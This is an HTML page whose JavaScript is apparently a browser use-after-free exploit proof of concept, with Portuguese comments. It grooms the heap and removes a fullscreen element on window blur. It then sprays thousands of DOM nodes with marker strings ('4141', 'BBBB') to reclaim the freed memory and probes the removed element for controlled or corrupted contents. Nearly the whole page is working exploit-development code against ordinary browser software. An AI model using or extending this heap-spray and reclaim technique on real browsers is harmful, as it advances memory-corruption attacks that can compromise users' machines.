<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>UAF Aggressive Reclaim (Hybrid Precision)</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<button onclick="runTest()">Run Test</button>

<script>

let logBuffer = [];

function log(m){
    try{console.log(m);}catch(e){}
    logBuffer.push(m);
}

// ==========================
function setupHeap(){
    let a=[];
    for(let i=0;i<5000;i++){
        let x=new Float64Array(8);
        a.push(x);
    }
}

// ==========================
function setupFS(){
    let fs=document.createElement("div");

    fs.innerHTML="<h1>FULLSCREEN</h1>";

    fs.style.cssText="position:absolute;width:100%;height:100%;background:black";

    document.body.appendChild(fs);

    fs.webkitRequestFullscreen?.();

    return fs;
}

// ==========================
// 💣 AGGRESSIVE + PRECISION
// ==========================
function reclaim(){

    log("[*] reclaim");

    let bucket=[];

    // 🔥 churn
    for(let i=0;i<8000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }

    // 🔥 HIGH DENSITY SPRAY (igual ao que funcionou)
    for(let i=0;i<12000;i++){
        let e=document.createElement("div");

        // ⚠️ curto = mais colisão
        e.innerHTML = "CTRL_"+i+"_4141";

        document.body.appendChild(e);
        bucket.push(e);
    }

    // 🔥 TEXT spray (mistura arenas)
    for(let i=0;i<12000;i++){
        let t=document.createTextNode("TXT_"+i+"_BBBB");
        document.body.appendChild(t);
        bucket.push(t);
    }

    // 🔥 ATTR spray
    for(let i=0;i<8000;i++){
        let e=document.createElement("div");
        e.setAttribute("x","CCCC_"+i);
        document.body.appendChild(e);
        bucket.push(e);
    }

    return bucket;
}

// ==========================
// PROBE
// ==========================
function probe(fs){

    log("---- PROBE ----");

    try{
        let v = fs.innerHTML;

        log("[LEN] "+(v ? v.length : "null"));
        log("[VAL] "+v);

        if(v){

            if(v.includes("4141"))
                log("[!!!] CONTROLLED HIT");

            if(v.length <= 2)
                log("[!!!] STRING CORROMPIDA");

        }

    }catch(e){
        log("[CRASH]");
    }
}

// ==========================
function trigger(fs){

    log("[*] Trigger");

    try{
        fs.remove();
        document.webkitExitFullscreen?.();
    }catch(e){}

    setTimeout(()=>reclaim(),0);
    setTimeout(()=>reclaim(),50);
    setTimeout(()=>reclaim(),100);

    setTimeout(()=>probe(fs),100);
    setTimeout(()=>probe(fs),200);
    setTimeout(()=>probe(fs),300);

    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    },400);

    setTimeout(()=>location.reload(),500);
}

// ==========================
function runTest(){

    log("[*] Start");

    setupHeap();

    let fs = setupFS();

    window.onblur = ()=>{
        log("[*] onblur");
        setTimeout(()=>trigger(fs),3000);
    };
}

</script>

</body>
</html>
